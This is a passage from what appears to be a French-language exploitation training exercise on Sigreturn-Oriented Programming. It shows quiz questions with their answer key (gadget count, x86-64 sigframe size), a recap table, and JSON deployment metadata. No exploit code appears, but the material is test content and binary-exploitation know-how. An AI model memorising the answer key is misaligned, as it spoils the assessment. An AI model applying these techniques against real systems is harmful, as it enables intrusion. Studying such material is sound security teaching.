B) 1 (syscall)
C) 2 (pop rax + syscall)
D) 6
E) 10
F) Variable selon le syscall
G) Un par registre
H) Autant que d'arguments
I) 15
J) 59

**Reponse : C**

---

### Question 5
**Quelle est la taille approximative d'une sigframe x86-64 ?**

A) 8 bytes
B) 32 bytes
C) 64 bytes
D) 128 bytes
E) 248 bytes
F) 512 bytes
G) 1024 bytes
H) Variable
I) 16 bytes
J) 4096 bytes

**Reponse : E**

---

## SECTION 8 : RECAPITULATIF

| Element | Valeur |
|---------|--------|
| **Difficulte** | 9/10 |
| **Temps estime** | 90 min |
| **XP Base** | 350 |
| **XP Bonus** | x2 (700 total) |
| **Concepts cles** | SROP, sigreturn, sigframe, registres |
| **Langage** | Python 3.12 |
| **Prerequis** | Signaux Unix, ROP, Syscalls |

---

## SECTION 9 : DEPLOYMENT PACK

```json
{
  "deploy": {
    "hackbrain_version": "5.5.2",
    "engine_version": "v22.1",
    "exercise_slug": "3.4.6-c-srop-master",
    "generated_at": "2026-01-16",

    "metadata": {
      "exercise_id": "3.4.6-c",
      "exercise_name": "srop_master",
      "module": "3.4.6",
      "module_name": "ROP Advanced Techniques",
      "concept": "c",
      "concept_name": "Sigreturn-Oriented Programming",
      "type": "code",
      "tier": 2,
      "phase": 3,
      "difficulty": 9,
      "language": "python",
      "duration_minutes": 90,
      "xp_base": 350,
      "prerequisites": ["ROP", "Signals", "Syscalls"],
      "domains": ["Exploit", "Kernel", "ASM"],
      "tags": ["srop", "sigreturn", "exploitation"]
    }
  }
}
```
